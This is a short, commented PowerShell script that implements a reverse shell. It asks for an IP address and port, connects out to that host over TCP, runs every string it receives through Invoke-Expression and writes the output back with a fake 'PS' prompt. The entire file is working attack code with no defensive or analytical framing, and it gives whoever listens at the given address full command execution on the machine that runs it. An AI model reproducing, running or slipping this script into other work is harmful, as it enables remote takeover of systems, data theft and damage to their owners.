$ip = Read-Host "Enter IP address"
$port = Read-Host "Enter port number"

#creating a new TCP client object.
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)

#getting the network stream associated with the TCP client object.
$stream = $client.GetStream() 

#creating a byte array to store the data received from the remote host.
[byte[]]$bytes = 0..65535|%{0}

#reading data from the network stream and executes it as PowerShell commands, then sending the output back to the remote host.
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}

#closing the TCP client object
$client.Close()
